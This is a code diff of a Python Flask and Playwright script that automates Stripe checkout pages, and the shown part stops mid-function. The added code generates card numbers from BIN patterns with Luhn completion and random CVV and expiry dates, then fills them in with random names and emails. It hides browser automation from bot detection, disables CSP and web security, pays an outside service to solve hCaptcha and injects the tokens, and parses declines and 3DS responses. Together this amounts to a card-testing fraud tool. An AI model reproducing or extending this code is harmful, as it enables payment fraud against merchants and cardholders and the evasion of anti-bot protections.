@@ -1,415 +1,1013 @@
-from flask import Flask, request, jsonify
-from playwright.async_api import async_playwright
-import json
-import time
-import base64
-import logging
 import os
 import asyncio
+import json
+import random
+import re
+import time
+import base64
 from datetime import datetime
+from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
+from playwright._impl._errors import TargetClosedError
+from flask import Flask, request, jsonify
 from dotenv import load_dotenv
-from typing import Dict, List, Any
+from collections import deque
+import httpx
+from urllib.parse import parse_qs
 
 load_dotenv()
 
-app = Flask(__name__)
-logging.basicConfig(level=logging.INFO)
-
-# Configuration
 CONFIG = {
-    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
     "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
+    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
+    "TWOCAPTCHA_API_KEY": os.getenv('TWOCAPTCHA_API_KEY'),
+    "RESPONSE_TIMEOUT_SECONDS": 30,  # Reduced for speed
+    "RETRY_DELAY": 1000,  # Reduced for speed
+    "RATE_LIMIT_REQUESTS": 10,  # Increased
+    "RATE_LIMIT_WINDOW": 60,
+    "MAX_RETRIES": 2,
     "BROWSERLESS_TIMEOUT": 60000,
+    "CAPTCHA_TIMEOUT": 120,
+    "FAST_MODE": True,  # Enable speed optimizations
+    "LOG_REQUEST_BODIES": True  # Enable request body logging
 }
 
-class HCaptchaNetworkCapture:
-    """Capture all hCaptcha network traffic including generated_pass_UUID"""
-    
-    def __init__(self):
-        self.all_requests = []
-        self.all_responses = []
-        self.generated_pass_uuid = None
-        self.hsw_challenge = None
+app = Flask(__name__)
+request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])
+
+# Custom exception for token found
+class CaptchaTokenFound(Exception):
+    """Raised when captcha token is found"""
+    pass
+
+# 2Captcha solver class (unchanged)
+class TwoCaptchaSolver:
+    def __init__(self, api_key):
+        self.api_key = api_key
+        self.base_url = "http://2captcha.com"
         
-    async def handle_request(self, request):
-        """Capture outgoing requests"""
-        url = request.url
+    async def solve_hcaptcha(self, sitekey, page_url):
+        """Solve HCaptcha using 2captcha service"""
+        if not self.api_key:
+            print("[CAPTCHA] No 2captcha API key configured")
+            return None
+            
+        print(f"[CAPTCHA] Submitting HCaptcha to 2captcha...")
         
-        # Log all hCaptcha related requests
-        if 'hcaptcha' in url.lower():
-            request_data = {
-                "type": "request",
-                "timestamp": datetime.now().isoformat(),
-                "url": url,
-                "method": request.method,
-                "headers": request.headers,
-                "resource_type": request.resource_type
-            }
-            
-            # Capture POST data if available
-            if request.method == "POST":
-                try:
-                    post_data = request.post_data
-                    if post_data:
-                        request_data["body"] = post_data
-                        # Try to parse as JSON or form data
-                        try:
-                            request_data["body_parsed"] = json.loads(post_data)
-                        except:
-                            # Try URL encoded
-                            from urllib.parse import parse_qs
-                            try:
-                                request_data["body_parsed"] = parse_qs(post_data)
-                            except:
-                                pass
-                except:
-                    pass
-            
-            self.all_requests.append(request_data)
-            
-            if 'getcaptcha' in url:
-                print(f"📤 [HCAPTCHA-REQUEST] {url[:80]}...")
-    
-    async def handle_response(self, response):
-        """Capture incoming responses"""
-        url = response.url
-        
-        # Log all hCaptcha related responses
-        if 'hcaptcha' in url.lower():
-            response_data = {
-                "type": "response",
-                "timestamp": datetime.now().isoformat(),
-                "url": url,
-                "status": response.status,
-                "status_text": response.status_text,
-                "headers": response.headers,
-            }
-            
-            # Try to get response body
-            try:
-                body = await response.body()
-                response_data["body_size"] = len(body)
+        try:
+            async with httpx.AsyncClient() as client:
+                submit_data = {
+                    'key': self.api_key,
+                    'method': 'hcaptcha',
+                    'sitekey': sitekey,
+                    'pageurl': page_url,
+                    'json': 1
+                }
                 
-                # Decode and parse
-                try:
-                    body_text = body.decode('utf-8')
+                response = await client.post(f"{self.base_url}/in.php", data=submit_data)
+                result = response.json()
+                
+                if result.get('status') != 1:
+                    print(f"[CAPTCHA] Submit failed: {result.get('error_text', 'Unknown error')}")
+                    return None
+                
+                captcha_id = result.get('request')
+                print(f"[CAPTCHA] Task ID: {captcha_id}")
+                
+                start_time = time.time()
+                while time.time() - start_time < CONFIG["CAPTCHA_TIMEOUT"]:
+                    await asyncio.sleep(5)
                     
-                    # Try JSON parse
-                    try:
-                        body_json = json.loads(body_text)
-                        response_data["body"] = body_json
-                        
-                        # Check for generated_pass_UUID
-                        if 'generated_pass_UUID' in body_json:
-                            self.generated_pass_uuid = body_json['generated_pass_UUID']
-                            print(f"✅ [FOUND] generated_pass_UUID: {self.generated_pass_uuid[:50]}...")
-                            
-                        # Check for HSW challenge
-                        if 'c' in body_json and isinstance(body_json['c'], dict):
-                            self.hsw_challenge = body_json['c']
-                            print(f"🔨 [FOUND] HSW Challenge: {body_json['c'].get('type')}")
-                            
-                        # Log key fields
-                        if 'pass' in body_json:
-                            print(f"🎫 [PASS] {body_json['pass']}")
-                        if 'expiration' in body_json:
-                            print(f"⏰ [EXPIRATION] {body_json['expiration']}s")
-                            
-                    except json.JSONDecodeError:
-                        response_data["body_text"] = body_text[:1000]
-                        
-                except UnicodeDecodeError:
-                    # Binary data - base64 encode
-                    response_data["body_base64"] = base64.b64encode(body).decode()
+                    check_url = f"{self.base_url}/res.php?key={self.api_key}&action=get&id={captcha_id}&json=1"
+                    response = await client.get(check_url)
+                    result = response.json()
                     
-            except Exception as e:
-                response_data["body_error"] = str(e)
-            
-            self.all_responses.append(response_data)
-            
-            if 'getcaptcha' in url:
-                print(f"📥 [HCAPTCHA-RESPONSE] {response.status} - {url[:80]}...")
-    
-    def get_summary(self):
-        """Get summary of captured data"""
-        return {
-            "total_requests": len(self.all_requests),
-            "total_responses": len(self.all_responses),
-            "generated_pass_uuid_found": self.generated_pass_uuid is not None,
-            "hsw_challenge_found": self.hsw_challenge is not None
-        }
+                    if result.get('status') == 1:
+                        token = result.get('request')
+                        print(f"[CAPTCHA] ✓ Solved! Token: {token[:30]}...")
+                        return token
+                    elif result.get('request') == 'CAPCHA_NOT_READY':
+                        elapsed = int(time.time() - start_time)
+                        print(f"[CAPTCHA] Solving... ({elapsed}s)")
+                        continue
+                    else:
+                        print(f"[CAPTCHA] Error: {result.get('error_text', 'Unknown')}")
+                        return None
+                
+                print("[CAPTCHA] Timeout waiting for solution")
+                return None
+                
+        except Exception as e:
+            print(f"[CAPTCHA] Error: {e}")
+            return None
 
-
-async def extract_hcaptcha_data(site_key: str, host: str = "checkout.stripe.com", timeout: int = 30):
-    """
-    Extract hCaptcha data including generated_pass_UUID using Playwright + browserless.io
+# Enhanced captcha detection and handling
+class CaptchaHandler:
+    @staticmethod
+    async def detect_hcaptcha(page):
+        """Detect HCaptcha on the page"""
+        try:
+            hcaptcha_frame = await page.query_selector('iframe[src*="hcaptcha.com"]')
+            if hcaptcha_frame:
+                return True
+                
+            hcaptcha_div = await page.query_selector('div[data-hcaptcha-widget-id]')
+            if hcaptcha_div:
+                return True
+                
+            hcaptcha_element = await page.query_selector('.h-captcha')
+            if hcaptcha_element:
+                return True
+                
+            return False
+            
+        except Exception as e:
+            return False
     
-    Args:
-        site_key: hCaptcha site key
-        host: Host domain
-        timeout: Timeout in seconds
+    @staticmethod
+    async def get_hcaptcha_sitekey(page):
+        """Extract HCaptcha sitekey from the page"""
+        try:
+            element = await page.query_selector('[data-sitekey]')
+            if element:
+                sitekey = await element.get_attribute('data-sitekey')
+                if sitekey:
+                    return sitekey
+            
+            iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
+            if iframe:
+                src = await iframe.get_attribute('src')
+                match = re.search(r'sitekey=([a-zA-Z0-9-]+)', src)
+                if match:
+                    return match.group(1)
+            
+            scripts = await page.query_selector_all('script')
+            for script in scripts:
+                content = await script.inner_text()
+                match = re.search(r'["\']sitekey["\']\s*:\s*["\']([a-zA-Z0-9-]+)["\']', content)
+                if match:
+                    return match.group(1)
+                    
+            return None
+            
+        except Exception as e:
+            return None
+    
+    @staticmethod
+    async def inject_captcha_token(page, token):
+        """Inject the solved captcha token into the page"""
+        try:
+            await page.evaluate(f'''
+                () => {{
+                    const responseField = document.querySelector('[name="h-captcha-response"]');
+                    if (responseField) {{
+                        responseField.value = '{token}';
+                        responseField.innerHTML = '{token}';
+                    }}
+                    
+                    const gResponseField = document.querySelector('[name="g-recaptcha-response"]');
+                    if (gResponseField) {{
+                        gResponseField.value = '{token}';
+                        gResponseField.innerHTML = '{token}';
+                    }}
+                    
+                    if (typeof hcaptcha !== 'undefined' && hcaptcha.execute) {{
+                        window.hcaptcha.execute();
+                    }}
+                    
+                    if (window.hcaptchaCallback) {{
+                        window.hcaptchaCallback('{token}');
+                    }}
+                    
+                    if (window.onHcaptchaCallback) {{
+                        window.onHcaptchaCallback('{token}');
+                    }}
+                }}
+            ''')
+            
+            await page.evaluate(f'''
+                () => {{
+                    const event = new CustomEvent('hcaptcha-verified', {{
+                        detail: {{ response: '{token}' }}
+                    }});
+                    document.dispatchEvent(event);
+                }}
+            ''')
+            
+            return True
+            
+        except Exception as e:
+            return False
+
+# Enhanced Universal Response Analyzer with Request Body Parsing
+class UniversalResponseAnalyzer:
+    def __init__(self, shared_state):
+        self.shared_state = shared_state
         
-    Returns:
-        Dict with all captured data
-    """
+    @staticmethod
+    def parse_request_body(body_data, content_type):
+        """Parse request body based on content type"""
+        if not body_data:
+            return None
+            
+        try:
+            # JSON content
+            if 'application/json' in content_type:
+                return json.loads(body_data)
+            
+            # Form data
+            elif 'application/x-www-form-urlencoded' in content_type:
+                parsed = parse_qs(body_data)
+                # Convert single-item lists to strings for readability
+                return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
+            
+            # Text or other
+            else:
+                return body_data[:1000] if len(body_data) > 1000 else body_data
+                
+        except Exception as e:
+            return {"parse_error": str(e), "raw": body_data[:500] if body_data else ""}
     
-    print(f"\n{'='*70}")
-    print(f"🚀 Starting hCaptcha Extraction")
-    print(f"{'='*70}")
-    print(f"Site Key: {site_key}")
-    print(f"Host: {host}")
-    print(f"Mode: {'Local' if CONFIG['RUN_LOCAL'] else 'Browserless.io'}")
-    print(f"{'='*70}\n")
+    def analyze_request(self, url, method, headers, body_text, result_dict):
+        """Analyze outgoing API request"""
+        if self.shared_state.captcha_token_found:
+            return
+
+        domain = url.split('/')[2] if '/' in url else url
+        endpoint = url.split('?')[0] if '?' in url else url
+        
+        # Parse request body
+        content_type = headers.get('content-type', '') if headers else ''
+        parsed_body = self.parse_request_body(body_text, content_type)
+        
+        # Store request data
+        request_data = {
+            "type": "request",
+            "url": url,
+            "domain": domain,
+            "endpoint": endpoint,
+            "method": method,
+            "timestamp": datetime.now().isoformat(),
+            "headers": dict(headers) if headers else {},
+            "body": parsed_body,
+            "body_size": len(body_text) if body_text else 0
+        }
+        
+        result_dict["raw_api_calls"].append(request_data)
+        
+        # Log important requests with body
+        is_payment_api = any(term in url.lower() for term in [
+            'stripe', 'payment', 'checkout', 'charge', 'token', 
+            'card', 'pay', 'billing', 'purchase', 'transaction', 'order'
+        ])
     
-    capture = HCaptchaNetworkCapture()
+    def analyze_response(self, url, status, headers, body_text, result_dict):
+        """Analyze incoming API response, prioritizing hCaptcha token detection"""
+        
+        domain = url.split('/')[2] if '/' in url else url
+        endpoint = url.split('?')[0] if '?' in url else url
+        
+        # Try to parse as JSON first
+        data = None
+        content_type = "text"
+        try:
+            data = json.loads(body_text)
+            content_type = "json"
+        except:
+            pass
+        
+        # --- CAPTCHA TOKEN EXTRACTION ---
+        if data and 'hcaptcha.com' in domain.lower() and ('getcaptcha' in url.lower() or 'checksiteconfig' in url.lower()):
+            if 'generated_pass_UUID' in data:
+                self.shared_state.captcha_token = data['generated_pass_UUID']
+                self.shared_state.captcha_token_found = True
+                print(f"\n{'#'*80}")
+                print("[CAPTCHA DETECTED] Generated Pass UUID Found!")
+                print(f"TOKEN: {self.shared_state.captcha_token}")
+                print(f"{'#'*80}\n")
+                
+                # Store this important response
+                response_data = {
+                    "type": "response",
+                    "url": url,
+                    "domain": domain,
+                    "endpoint": endpoint,
+                    "status": status,
+                    "timestamp": datetime.now().isoformat(),
+                    "headers": dict(headers) if headers else {},
+                    "size": len(body_text) if body_text else 0,
+                    "data": data,
+                    "content_type": content_type
+                }
+                result_dict["raw_api_calls"].append(response_data)
+                
+                # Raise custom exception to stop execution
+                raise CaptchaTokenFound(self.shared_state.captcha_token)
+            
+        # If token already found, skip processing
+        if self.shared_state.captcha_token_found:
+            return
+
+        # Normal response processing
+        response_data = {
+            "type": "response",
+            "url": url,
+            "domain": domain,
+            "endpoint": endpoint,
+            "status": status,
+            "timestamp": datetime.now().isoformat(),
+            "headers": dict(headers) if headers else {},
+            "size": len(body_text) if body_text else 0
+        }
+        
+        if content_type == "json":
+            response_data["data"] = data
+            response_data["content_type"] = "json"
+        else:
+            response_data["data"] = body_text[:1000] if body_text else ""
+            response_data["content_type"] = "text"
+        
+        # Store in raw responses
+        result_dict["raw_api_calls"].append(response_data)
+        
+        # Analyze for payment success
+        if content_type == "json":
+            # Check for errors
+            error_fields = ['error', 'error_message', 'message', 'decline_reason', 'failure_reason']
+            for field in error_fields:
+                if field in data and data[field]:
+                    result_dict["error"] = str(data[field])
+                    result_dict["success"] = False
+                    break
+            
+            # 3DS detection
+            if any(term in str(data).lower() for term in ['3d', 'authentication', 'verify', 'challenge']):
+                result_dict["requires_3ds"] = True
+
+def rate_limit_check():
+    now = time.time()
+    while request_timestamps and request_timestamps[0] < now - CONFIG["RATE_LIMIT_WINDOW"]:
+        request_timestamps.popleft()
+    
+    if len(request_timestamps) >= CONFIG["RATE_LIMIT_REQUESTS"]:
+        oldest = request_timestamps[0]
+        wait_time = CONFIG["RATE_LIMIT_WINDOW"] - (now - oldest)
+        return False, wait_time
+    
+    request_timestamps.append(now)
+    return True, 0
+
+# Card utilities (unchanged)
+def luhn_algorithm(number_str):
+    total = 0
+    reverse_digits = number_str[::-1]
+    for i, digit in enumerate(reverse_digits):
+        n = int(digit)
+        if (i % 2) == 1:
+            n *= 2
+            if n > 9:
+                n -= 9
+        total += n
+    return total % 10 == 0
+
+def complete_luhn(base):
+    for d in range(10):
+        candidate = base + str(d)
+        if luhn_algorithm(candidate):
+            return candidate
+    return None
+
+def get_card_length(bin_str):
+    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
+    return 15 if first_two in ['34', '37'] else 16
+
+def get_cvv_length(card_number):
+    return 4 if len(card_number) == 15 else 3
+
+def random_digit():
+    return str(random.randint(0, 9))
+
+def generate_card_from_pattern(pattern):
+    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
+    card_length = get_card_length(clean_pattern.replace('x', '0'))
+    
+    result = ''
+    for char in clean_pattern:
+        if len(result) >= card_length - 1:
+            break
+        result += random_digit() if char.lower() == 'x' else char
+    
+    while len(result) < card_length - 1:
+        result += random_digit()
+    
+    result = result[:card_length - 1]
+    return complete_luhn(result) or result + '0'
+
+def process_card_with_placeholders(number, month, year, cvv):
+    processed_number = generate_card_from_pattern(number) if 'x' in number.lower() else number
+    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
+    
+    current_year = datetime.now().year
+    if 'x' in year.lower():
+        processed_year = str(random.randint(current_year + 1, current_year + 6))
+    elif len(year) == 2:
+        processed_year = '20' + year
+    else:
+        processed_year = year
+    
+    cvv_length = get_cvv_length(processed_number)
+    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
+    
+    return {
+        "number": processed_number,
+        "month": processed_month,
+        "year": processed_year,
+        "cvv": processed_cvv
+    }
+
+def process_card_input(cc_string):
+    parts = cc_string.split('|')
+    if len(parts) != 4:
+        return None
+    return process_card_with_placeholders(*parts)
+
+def generate_random_name():
+    first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Avery', 'Quinn', 'Sage', 'Parker']
+    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
+    return f"{random.choice(first_names)} {random.choice(last_names)}"
+
+async def safe_wait(page, ms):
+    try:
+        await page.wait_for_timeout(ms)
+        return True
+    except:
+        return False
+
+async def wait_for_network_idle(page, timeout=5000):
+    """Wait for network to be idle"""
+    try:
+        await page.wait_for_load_state('networkidle', timeout=timeout)
+        return True
+    except:
+        return False
+
+# Shared state class
+class ExecutionControl:
+    def __init__(self):
+        self.captcha_token_found = False
+        self.captcha_token = None
+
+async def run_stripe_automation(url, cc_string, email=None):
+    card = process_card_input(cc_string)
+    if not card:
+        return {"error": "Invalid card format"}
+    
+    email = email or f"test{random.randint(1000,9999)}@example.com"
+    random_name = generate_random_name()
+    
+    # Initialize shared state
+    shared_state = ExecutionControl()
+    
+    print(f"\n{'='*80}")
+    print(f"[START] {datetime.now().strftime('%H:%M:%S')}")
+    print(f"[CARD] {card['number']} | {card['month']}/{card['year']} | {card['cvv']}")
+    print(f"[EMAIL] {email}")
+    print(f"[MODE] {'FAST' if CONFIG['FAST_MODE'] else 'NORMAL'} (Halt on Token)")
+    print('='*80)
+    
+    stripe_result = {
+        "status": "pending",
+        "raw_api_calls": [],
+        "payment_confirmed": False,
+        "token_created": False,
+        "payment_method_created": False,
+        "payment_intent_created": False,
+        "success_url": None,
+        "requires_3ds": False,
+        "captcha_solved": False,
+        "network_requests": 0,
+        "network_errors": 0
+    }
+    
+    analyzer = UniversalResponseAnalyzer(shared_state)
+    captcha_handler = CaptchaHandler()
+    captcha_solver = TwoCaptchaSolver(CONFIG.get("TWOCAPTCHA_API_KEY"))
     
     async with async_playwright() as p:
         browser = None
         context = None
         page = None
+        payment_submitted = False
         
         try:
-            # Browser setup - same pattern as your working code
+            # Browser setup
             browser_args = [
                 '--no-sandbox',
-                '--disable-setuid-usage',
+                '--disable-setuid-sandbox',
                 '--disable-dev-shm-usage',
                 '--disable-blink-features=AutomationControlled',
                 '--disable-web-security',
+                '--disable-features=IsolateOrigins,site-per-process',
+                '--allow-running-insecure-content',
+                '--disable-popup-blocking',
+                '--disable-content-security-policy'
             ]
             
             if CONFIG["RUN_LOCAL"]:
-                print("[BROWSER] Launching local browser...")
                 browser = await p.chromium.launch(
-                    headless=False,
+                    headless=False, 
+                    slow_mo=50 if CONFIG['FAST_MODE'] else 100,
                     args=browser_args
                 )
             else:
-                # UPDATED: Use production-sfo endpoint (not legacy chrome.browserless.io)
-                print("[BROWSER] Connecting to browserless.io...")
                 browser_url = f"wss://production-sfo.browserless.io/chromium/playwright?token={CONFIG['BROWSERLESS_API_KEY']}&timeout={CONFIG['BROWSERLESS_TIMEOUT']}"
-                
                 try:
                     browser = await p.chromium.connect(browser_url, timeout=30000)
-                    print("[BROWSER] ✅ Connected to browserless.io")
                 except Exception as e:
-                    print(f"[BROWSER] ❌ Connection failed: {e}")
-                    # Fallback to local
-                    print("[BROWSER] Falling back to local browser...")
                     browser = await p.chromium.launch(headless=True, args=browser_args)
             
-            # Create context with realistic settings
+            # Create context
             context = await browser.new_context(
                 viewport={'width': 1920, 'height': 1080},
                 user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 locale='en-US',
                 timezone_id='America/New_York',
                 ignore_https_errors=True,
+                bypass_csp=True,
                 java_script_enabled=True,
+                permissions=['geolocation', 'notifications', 'camera', 'microphone'],
+                extra_http_headers={
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept': '*/*',
+                    'Accept-Encoding': 'gzip, deflate, br'
+                }
             )
             
-            # Add stealth script
+            # Add stealth scripts
             await context.add_init_script("""
+                // Remove webdriver flag
                 Object.defineProperty(navigator, 'webdriver', {
                     get: () => false,
                 });
                 
+                // Add plugins
+                Object.defineProperty(navigator, 'plugins', {
+                    get: () => [1, 2, 3, 4, 5],
+                });
+                
+                // Chrome specific
                 window.chrome = {
                     runtime: {},
                     loadTimes: function() {},
                     csi: function() {},
                     app: {}
                 };
+                
+                // Permission overrides
+                const originalQuery = window.navigator.permissions.query;
+                window.navigator.permissions.query = (parameters) => (
+                    parameters.name === 'notifications' ?
+                        Promise.resolve({ state: Notification.permission }) :
+                        originalQuery(parameters)
+                );
+                
+                // Ensure all iframes load properly
+                window.addEventListener('message', function(e) {
+                    // console.log('Frame message:', e.origin, e.data);
+                }, false);
             """)
             
             page = await context.new_page()
             
-            # Attach network handlers
-            page.on("request", capture.handle_request)
-            page.on("response", capture.handle_response)
-            
-            # Log console messages
-            page.on("console", lambda msg: print(f"[CONSOLE] {msg.text[:200]}") if msg.type == 'error' else None)
-            
-            # Create test page with hCaptcha
-            html_content = f"""
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>hCaptcha Data Extraction</title>
-    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
-    <style>
-        body {{
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #f5f5f5;
-        }}
-        .container {{
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }}
-        h1 {{
-            color: #333;
-            margin-bottom: 20px;
-        }}
-        #status {{
-            padding: 15px;
-            margin: 20px 0;
-            background: #e3f2fd;
-            border-left: 4px solid #2196f3;
-            border-radius: 4px;
-            font-family: monospace;
-        }}
-        .h-captcha {{
-            margin: 20px 0;
-        }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🔐 hCaptcha Data Extraction</h1>
-        <div id="status">Initializing hCaptcha...</div>
-        <div class="h-captcha" data-sitekey="{site_key}"></div>
-    </div>
-    
-    <script>
-        console.log('Page loaded, initializing hCaptcha...');
-        
-        let checkCount = 0;
-        const maxChecks = 20;
-        
-        function checkHCaptcha() {{
-            checkCount++;
-            const status = document.getElementById('status');
-            
-            if (typeof hcaptcha !== 'undefined') {{
-                status.innerHTML = '✅ hCaptcha API loaded and initialized';
-                console.log('hCaptcha ready');
-            }} else if (checkCount < maxChecks) {{
-                status.innerHTML = `⏳ Loading hCaptcha... (${{checkCount}}/${{maxChecks}})`;
-                setTimeout(checkHCaptcha, 500);
-            }} else {{
-                status.innerHTML = '❌ hCaptcha failed to load';
-            }}
-        }}
-        
-        window.addEventListener('load', function() {{
-            setTimeout(checkHCaptcha, 1000);
-        }});
-        
-        // Log hCaptcha callbacks if fired
-        window.hcaptchaOnLoad = function() {{
-            console.log('hCaptcha onLoad callback fired');
-        }};
-        
-        window.hcaptchaCallback = function(token) {{
-            console.log('hCaptcha solved! Token:', token.substring(0, 20) + '...');
-        }};
-    </script>
-</body>
-</html>
-"""
-            
-            # Navigate to data URL
-            print("[PAGE] Loading hCaptcha page...")
-            await page.goto(f"data:text/html,{html_content}", wait_until="networkidle", timeout=40000)
-            print("[PAGE] ✅ Page loaded")
-            
-            # Wait for hCaptcha to initialize and make API calls
-            print("[WAIT] Waiting for hCaptcha to initialize...")
-            
-            # Check for hCaptcha iframe
-            try:
-                await page.wait_for_selector('iframe[src*="hcaptcha"]', timeout=10000)
-                print("[IFRAME] ✅ hCaptcha iframe detected")
-            except:
-                print("[IFRAME] ⚠️  No iframe detected yet, continuing...")
-            
-            # Wait for network activity
-            await asyncio.sleep(8)  # Give time for all API calls
-            
-            # Additional wait for late-loading resources
-            try:
-                await page.wait_for_load_state('networkidle', timeout=5000)
-            except:
-                pass
-            
-            # Get all frames for debugging
-            frames = page.frames
-            print(f"[FRAMES] Total frames: {len(frames)}")
-            for idx, frame in enumerate(frames):
+            # Network interception handlers
+            async def capture_request(request):
+                if shared_state.captcha_token_found:
+                    return
                 try:
-                    if frame.url and 'hcaptcha' in frame.url:
-                        print(f"  Frame {idx}: {frame.url[:80]}...")
-                except:
+                    stripe_result["network_requests"] += 1
+                    url = request.url
+                    method = request.method
+                    headers = request.headers
+                    
+                    body_text = None
+                    try:
+                        if method in ['POST', 'PUT', 'PATCH']:
+                            body = request.post_data
+                            if body:
+                                body_text = body
+                                analyzer.analyze_request(url, method, headers, body_text, stripe_result)
+                    except:
+                        pass
+                except Exception as e:
                     pass
             
-            # Get cookies
-            cookies = await context.cookies()
-            hcaptcha_cookies = [c for c in cookies if 'hcaptcha' in c.get('domain', '').lower()]
-            
-            print(f"\n[SUMMARY]")
-            print(f"  Requests captured: {len(capture.all_requests)}")
-            print(f"  Responses captured: {len(capture.all_responses)}")
-            print(f"  hCaptcha cookies: {len(hcaptcha_cookies)}")
-            print(f"  generated_pass_UUID: {'✅ FOUND' if capture.generated_pass_uuid else '❌ NOT FOUND'}")
-            
-            # Decode JWT if found
-            decoded_pass_uuid = None
-            if capture.generated_pass_uuid:
+            async def capture_response(response):
+                if shared_state.captcha_token_found:
+                    return
                 try:
-                    decoded_pass_uuid = decode_jwt_token(capture.generated_pass_uuid)
+                    url = response.url
+                    status = response.status
+                    headers = response.headers
+                    
+                    try:
+                        body = await response.body()
+                        text = body.decode('utf-8', errors='ignore') if body else ""
+                        
+                        # This will raise CaptchaTokenFound if token is found
+                        analyzer.analyze_response(url, status, headers, text, stripe_result)
+                        
+                    except CaptchaTokenFound:
+                        # Token found, stop processing
+                        return
+                    except Exception as e:
+                        analyzer.analyze_response(url, status, headers, "", stripe_result)
+                        
+                except CaptchaTokenFound:
+                    return
                 except Exception as e:
-                    print(f"[JWT] Decode error: {e}")
+                    stripe_result["network_errors"] += 1
             
-            # Build result
-            result = {
-                "success": True,
-                "timestamp": datetime.now().isoformat(),
-                "site_key": site_key,
-                "host": host,
-                "summary": capture.get_summary(),
-                "generated_pass_uuid": {
-                    "token": capture.generated_pass_uuid,
-                    "decoded": decoded_pass_uuid
-                } if capture.generated_pass_uuid else None,
-                "hsw_challenge": capture.hsw_challenge,
-                "network": {
-                    "requests": capture.all_requests,
-                    "responses": capture.all_responses
-                },
-                "cookies": hcaptcha_cookies,
-                "page_info": {
-                    "url": page.url,
-                    "title": await page.title(),
-                    "frames": len(frames)
+            async def capture_request_failed(request):
+                if shared_state.captcha_token_found:
+                    return
+                stripe_result["network_errors"] += 1
+            
+            # Attach handlers
+            page.on("request", capture_request)
+            page.on("response", capture_response)
+            page.on("requestfailed", capture_request_failed)
+            
+            # Route interception
+            await page.route('**/*', lambda route, request: route.continue_())
+            
+            # Console logging
+            page.on("console", lambda msg: None)
+            page.on("pageerror", lambda error: None)
+            
+            try:
+                # Navigate to page
+                print("[NAV] Loading page...")
+                await page.goto(url, wait_until="networkidle", timeout=40000)
+                print("[NAV] ✓ Page loaded")
+                
+                # Wait for dynamic content
+                await wait_for_network_idle(page, 5000)
+                
+                # Ensure all frames are loaded
+                frames = page.frames
+                
+                # Wait for lazy-loaded content
+                await safe_wait(page, 2000 if CONFIG['FAST_MODE'] else 3000)
+                
+                # Check for HCaptcha
+                has_captcha = await captcha_handler.detect_hcaptcha(page)
+                if has_captcha:
+                    print("[CAPTCHA] HCaptcha detected on page")
+                    sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
+                    
+                    if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
+                        print(f"[CAPTCHA] Sitekey found: {sitekey}")
+                        token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
+                        
+                        if token:
+                            await captcha_handler.inject_captcha_token(page, token)
+                            stripe_result["captcha_solved"] = True
+                            await safe_wait(page, 1000 if CONFIG['FAST_MODE'] else 2000)
+                
+                # Check if token was found
+                if shared_state.captcha_token_found:
+                    print(f"\n[FINAL RESULT] CAPTCHA Token Successfully Captured!")
+                    print(f"Token: {shared_state.captcha_token}")
+                    return {
+                        "success": True,
+                        "action": "CAPTCHA_TOKEN_CAPTURED",
+                        "generated_pass_UUID": shared_state.captcha_token,
+                        "all_api_calls": stripe_result['raw_api_calls'],
+                        "network_stats": {
+                            "total_requests": stripe_result['network_requests'],
+                            "api_calls": len(stripe_result['raw_api_calls']),
+                            "errors": stripe_result['network_errors']
+                        }
+                    }
+                
+                # Continue with normal flow if no token found yet...
+                # Fill email
+                email_filled = False
+                email_selectors = [
+                    'input[type="email"]',
+                    'input[name="email"]',
+                    '#email',
+                    'input[placeholder*="email" i]',
+                    'input[id*="email" i]',
+                    'input[autocomplete="email"]'
+                ]
+                
+                for selector in email_selectors:
+                    if email_filled or shared_state.captcha_token_found:
+                        break
+                    try:
+                        elements = await page.query_selector_all(selector)
+                        for element in elements:
+                            if await element.is_visible():
+                                await element.scroll_into_view_if_needed()
+                                await element.click()
+                                await element.fill("")
+                                await element.type(email, delay=20 if CONFIG['FAST_MODE'] else 50)
+                                email_filled = True
+                                break
+                    except:
+                        continue
+                
+                await safe_wait(page, 500 if CONFIG['FAST_MODE'] else 1500)
+                
+                # Fill card details
+                filled_status = {"card": False, "expiry": False, "cvc": False, "name": False}
+                
+                # Fill name
+                try:
+                    name_selectors = [
+                        'input[name*="name" i]:not([name*="email"])',
+                        'input[placeholder*="name" i]:not([placeholder*="email"])',
+                        '#cardholder-name',
+                        'input[autocomplete*="name"]'
+                    ]
+                    for selector in name_selectors:
+                        if filled_status["name"] or shared_state.captcha_token_found:
+                            break
+                        elements = await page.query_selector_all(selector)
+                        for element in elements:
+                            if await element.is_visible():
+                                await element.click()
+                                await element.fill(random_name)
+                                filled_status["name"] = True
+                                break
+                except:
+                    pass
+                
+                # Get all frames
+                all_frames = []
+                def collect_frames(frame):
+                    all_frames.append(frame)
+                    for child in frame.child_frames:
+                        collect_frames(child)
+                
+                collect_frames(page.main_frame)
+                stripe_frames = [f for f in all_frames if 'stripe' in f.url.lower() or 'checkout' in f.url.lower()]
+                
+                # Fill card details
